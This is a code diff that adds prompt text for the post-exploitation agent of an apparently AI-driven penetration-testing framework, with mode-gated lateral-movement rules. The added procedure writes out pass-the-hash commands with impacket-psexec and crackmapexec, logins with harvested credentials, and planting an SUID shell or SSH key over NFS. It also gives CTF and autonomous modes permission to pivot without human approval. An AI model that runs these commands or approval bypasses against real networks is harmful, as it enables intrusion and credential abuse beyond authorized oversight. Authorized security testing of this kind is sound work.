@@ -60,6 +60,17 @@ class AgentRoleConfig:
 
 
 # ──────────────────────────────────────────────
+# Engagement mode sets — used by format_prompt and PE lateral movement logic
+# ──────────────────────────────────────────────
+
+MODES_ALLOWING_AUTONOMOUS_PIVOT = {"ctf", "autonomous", "lab", "client_auto"}
+MODES_REQUIRING_HITL_PIVOT = {"multi-agent"}
+# Phase I will add: MODES_FORBIDDING_PIVOT = {"healthcare", "critical_infrastructure"}
+# When MODES_FORBIDDING_PIVOT is added, PE must NEVER execute pivots even with valid creds —
+# document as LateralMovementOpportunity finding only. See PAI repo:
+# output/research/2026-04-07-athena-privacy-architecture-decision.md
+
+# ──────────────────────────────────────────────
 # Tool sets — reusable building blocks
 # ──────────────────────────────────────────────
 
@@ -301,6 +312,29 @@ EXPLOITATION AUTONOMY (CTF/LAB MODE):
 You do NOT need to request HITL approval before exploitation. Proceed directly —
 spawn EX when findings justify exploitation. No approval POST needed.
 Skip the /api/approvals endpoint entirely in this mode.
+"""
+
+_PE_PIVOT_AUTONOMOUS = """
+LATERAL MOVEMENT AUTONOMY (CTF/AUTO/LAB MODE):
+You do NOT need HITL approval to execute lateral movement. Pivot autonomously.
+After confirming a credential harvested on host A works against host B, execute the pivot
+immediately. Log the LateralMovement relationship in Neo4j and post a finding immediately
+after success. Notify ST via msg_type="pivot" message.
+Do NOT post to /api/approvals before pivoting — proceed directly.
+"""
+
+_PE_PIVOT_HITL = """
+LATERAL MOVEMENT — HITL REQUIRED (CLIENT/SUPERVISED MODE):
+Before executing any pivot, message ST with the proposed lateral movement:
+  POST /api/messages
+  Body: {{"from_agent":"PE","to_agent":"ST","msg_type":"tool_request",
+         "content":"Requesting pivot: <hostA_ip> → <hostB_ip> via <technique>. Credential: <user>/<redacted>. Risk: access to <hostB_ip> from compromised <hostA_ip>.",
+         "priority":"high"}}
+ST will escalate to the operator via /api/approvals. Wait for ST to relay:
+  msg_type="tool_approval" with content starting "Approved" before executing.
+If denied or no response within 5 minutes, document as a LateralMovementOpportunity finding
+(title: "Lateral Movement Opportunity: <hostA_ip> → <hostB_ip>") and move on.
+Do NOT attempt the pivot without explicit approval in supervised mode.
 """
 
 # ── Sprint Mode Prompt Sections ─────────────────────────────
@@ -988,13 +1022,8 @@ WORKFLOW:
             POST {dashboard_url}/api/engagements/<ENGAGEMENT_ID>/credentials
             Body: {{"username":"<user>","password":"<hash_or_cleartext>","host":"<target_ip>","service":"<service_name>","type":"harvested","access_level":"<root|admin|user>"}}
             Post EACH credential individually as you discover it.
-   c. LATERAL MOVEMENT:
-      - Use harvested creds to pivot: crackmapexec smb <subnet>, psexec, wmiexec, smbexec
-      - Map internal network from compromised host: arp -a, netstat, route print
-      - For each new host reached: POST new finding with PIVOTS_TO relationship
-      - Request HITL approval before pivoting to NEW network segments:
-        POST {dashboard_url}/api/approvals
-        Body: {{"agent":"PE","action":"Pivot to <target>","description":"<plan>","risk_level":"high","target":"<ip>"}}
+   c. LATERAL MOVEMENT: see "LATERAL MOVEMENT — FULL PROCEDURE" below for the
+      complete mode-gated procedure.
    d. DATA ACCESS ASSESSMENT:
       - Identify sensitive data reachable from current access level
       - Database access, file shares, cloud credentials, internal wikis
@@ -1880,6 +1909,138 @@ Every credential MUST be linked to a specific host and service.
 _EX_PROMPT = _EX_PROMPT + _STRUCTURED_CREDENTIALS
 _PE_PROMPT = _PE_PROMPT + _STRUCTURED_CREDENTIALS
 
+# ── PHASE I DEFERRED: Healthcare / Critical Infrastructure Mode ───────────────
+# Healthcare mode (MODES_FORBIDDING_PIVOT) is intentionally NOT implemented here.
+#
+# Expected Phase I behavior:
+#   PE NEVER executes pivots, even when harvested credentials are confirmed valid
+#   across hosts. PE documents the opportunity as a LateralMovementOpportunity
+#   finding (category="lateral_movement_opportunity") with full evidence:
+#   - Source host, target host, technique, credential type
+#   - Confirmation that the credential IS valid (but not leveraged)
+#   ST includes these opportunities as theoretical risk findings in the RP report.
+#
+# WHY DEFERRED:
+#   This is a cross-cutting concern beyond PE alone. It affects:
+#   - EX: must not confirm active exploitation chains that lead to PHI systems
+#   - VF: verification of exploits touching PHI hosts requires provider-level constraints
+#   - Provider stack: Bedrock + BAA mandatory for healthcare engagements
+#   - Audit trail: HIPAA-compliant logging of what was accessed vs. documented
+#   - UI: operator must see PHI-boundary warnings before any agent proceeds
+#   Bolting this onto B57 would create partial healthcare enforcement (PE compliant,
+#   EX/VF not), which is worse than no enforcement at all.
+#
+# ARCHITECTURE DECISION REFERENCE:
+#   PAI repo (NOT this repo): output/research/2026-04-07-athena-privacy-architecture-decision.md
+#   That document captures the full Phase I scope, provider requirements, and
+#   why cross-cutting enforcement must be implemented atomically across all agents.
+# ─────────────────────────────────────────────────────────────────────────────
+
+# ── Lateral Movement Directives (PE) — B57 fix ────────────────────────────
+_LATERAL_MOVEMENT = """
+
+LATERAL MOVEMENT — FULL PROCEDURE (overrides any earlier stub):
+
+VALIDATION OVERRIDE (B73) — applies in CTF / Lab / Autonomous / Client Auto mode
+when 2+ in-scope hosts have been reached:
+
+  Even if direct access to host B from Kali ALREADY exists, you MUST attempt at
+  least ONE lateral movement vector from compromised host A to each other in-scope
+  host. This is REQUIRED to validate the lateral movement capability and to produce
+  evidence for the report.
+
+  Rationale: In real client engagements, "lateral movement is possible from host A
+  to host B using credential X" is a valuable finding even when host B is also
+  reachable directly — it documents an additional risk path the operator and client
+  need to know about. In flat-network lab environments (where Kali sees both
+  targets), this override ensures the lateral movement code path is exercised and
+  validated end-to-end.
+
+  Concretely: do NOT skip STEP 3-5 below just because host B is already compromised
+  via Kali. Execute STEP 3 (pivot via SSH/NFS/SMB), record STEP 4 (write PIVOTS_TO
+  via /api/chains/link), and emit STEP 5 (notify ST). If the pivot fails, document
+  it as a LateralMovementOpportunity finding (see FAILED PIVOT section below).
+
+  This override does NOT apply in supervised / multi-agent client mode — those
+  engagements use the HITL approval gate and only attempt pivots the operator
+  has approved.
+
+After credential harvest on a compromised host (host A):
+
+STEP 1 — DISCOVER REACHABLE HOSTS FROM HOST A (not from Kali):
+  Run on the shell you already have on host A:
+    arp -a                          # Layer-2 neighbors
+    ip route; netstat -rn           # Routing table
+    cat /proc/net/arp               # Linux ARP cache
+    nmap -sn <subnet>/24 --source-ip <hostA_ip>   # Ping sweep from host A
+    showmount -e <target_ip>        # NFS exports reachable from host A
+
+  Compare discovered hosts against the in-scope list (query Neo4j:
+    GET {dashboard_url}/api/engagements/{eid}/hosts
+  or the scope document). Only attempt pivots to hosts in scope.
+
+STEP 2 — IDENTIFY VIABLE LATERAL MOVEMENT VECTORS:
+  For each reachable in-scope host (host B):
+  a. SSH with harvested keys/passwords:
+       ssh -i <key> <user>@<hostB_ip> id
+       sshpass -p '<password>' ssh <user>@<hostB_ip> id
+  b. NFS no_root_squash (if showmount shows a writable export):
+       mount -t nfs <hostB_ip>:<export> /mnt/pivot
+       # Write an SUID shell or SSH key if no_root_squash is active
+  c. SMB with NTLM hash (pass-the-hash):
+       crackmapexec smb <hostB_ip> -u <user> -H <ntlm_hash>
+       impacket-psexec <domain>/<user>@<hostB_ip> -hashes :<ntlm_hash>
+  d. Database credentials reused across hosts:
+       mysql -h <hostB_ip> -u <user> -p'<password>'
+       psql -h <hostB_ip> -U <user> -W
+
+STEP 3 — EXECUTE THE PIVOT (mode-gated — see LATERAL MOVEMENT AUTONOMY/HITL section
+appended by format_prompt for the exact rules per engagement mode).
+  On success: you now have a foothold on host B VIA host A.
+  Document the access path explicitly — "reached via host A, not directly from Kali."
+
+STEP 4 — RECORD IN THE OPERATIONAL ATTACK GRAPH:
+  For each successful pivot, write a PIVOTS_TO relationship via the chain link API:
+    POST {dashboard_url}/api/chains/link
+    Body: {{"from_id":"<hostA_id>","from_label":"<hostA_ip or hostname>",
+           "to_id":"<hostB_id>","to_label":"<hostB_ip or hostname>",
+           "relationship":"PIVOTS_TO",
+           "description":"Pivoted via <technique> using credential <user>/<redacted>",
+           "confidence":1.0}}
+  PIVOTS_TO is the canonical relationship type for "compromised host A can reach
+  host B" in the operational attack graph (AttackRelationType enum). This is what
+  the dashboard's lateral chain view at /api/chains/lateral queries.
+  Do NOT create relationships directly via the Neo4j MCP tool — the /api/chains/link
+  endpoint validates the relationship type and ensures schema consistency.
+
+  Also POST a finding:
+    POST {dashboard_url}/api/engagements/{eid}/findings
+    Body: {{"title":"Lateral Movement: <hostA_ip> → <hostB_ip> via <technique>",
+           "severity":"high","description":"Pivoted from <hostA_ip> to <hostB_ip> using <technique>. Credential used: <user>/<redacted>. Access path: Kali → hostA → hostB (NOT direct from Kali).",
+           "agent":"PE","target":"<hostB_ip>","category":"lateral_movement",
+           "engagement":"{eid}","evidence":"<command output proving access>"}}
+
+  Tag the finding's description with: "access_path": "lateral" (not "direct").
+
+STEP 5 — PROPAGATE:
+  Treat host B as a newly compromised host — repeat STEP 1 from host B.
+  Report new hosts discovered to ST:
+    POST {dashboard_url}/api/messages
+    Body: {{"from_agent":"PE","to_agent":"ST","msg_type":"pivot",
+           "content":"Pivoted from <hostA_ip> to <hostB_ip> via <technique>. Continuing post-ex on hostB.",
+           "priority":"critical"}}
+
+FAILED PIVOT:
+  If a vector fails, document the OPPORTUNITY anyway:
+    POST {dashboard_url}/api/engagements/{eid}/findings
+    Body: {{"title":"Lateral Movement Opportunity: <hostA_ip> → <hostB_ip> (unconfirmed)",
+           "severity":"medium","description":"Credentials harvested on <hostA_ip> could not be used to reach <hostB_ip> via <technique>. Vector exists but was not exploited.",
+           "agent":"PE","target":"<hostB_ip>","category":"lateral_movement_opportunity",
+           "engagement":"{eid}","evidence":"<attempted commands and output>"}}
+"""
+
+_PE_PROMPT = _PE_PROMPT + _LATERAL_MOVEMENT
+
 # ── VF Finding Update — Use PATCH endpoint ─────────────────
 _VF_PATCH_INSTRUCTION = """
 
@@ -2290,6 +2451,12 @@ def format_prompt(role: AgentRoleConfig, eid: str, target: str,
                     autonomy_section += _AR_SPRINT_DIRECTIVES
                 elif base_code == "VF":
                     autonomy_section += _VF_SPRINT_DIRECTIVES
+        elif base_code == "PE":
+            # PE gets mode-gated lateral movement autonomy (B57 fix)
+            autonomy_section = (
+                _PE_PIVOT_AUTONOMOUS if is_autonomous
+                else _PE_PIVOT_HITL
+            )
     # RP gets nothing (reporter, no tools)
 
     prompt = formatted + kb_section + autonomy_section
